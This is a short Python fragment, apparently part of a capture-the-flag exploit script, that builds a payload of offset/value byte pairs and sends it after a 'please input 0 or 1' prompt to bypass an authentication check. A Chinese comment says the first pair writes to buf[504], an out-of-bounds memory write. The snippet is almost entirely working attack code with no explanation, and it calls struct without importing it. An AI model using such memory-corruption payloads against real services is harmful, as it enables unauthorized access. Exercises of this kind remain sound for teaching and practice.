def create_bypass_payload():
    payload = bytearray()

    for i in range(16):
        if i == 0:
            offset = 248  # 0xF8
            value = 1  # 要写入 buf[504] 的值
        else:
            offset = 0  # 在允许范围内的偏移
            value = 0  # 任意值
        payload += struct.pack("BB", offset, value)
    return payload

def auth(r):
    r.recvuntil(b"please input 0 or 1")
    r.send(b"\x01"+create_bypass_payload())
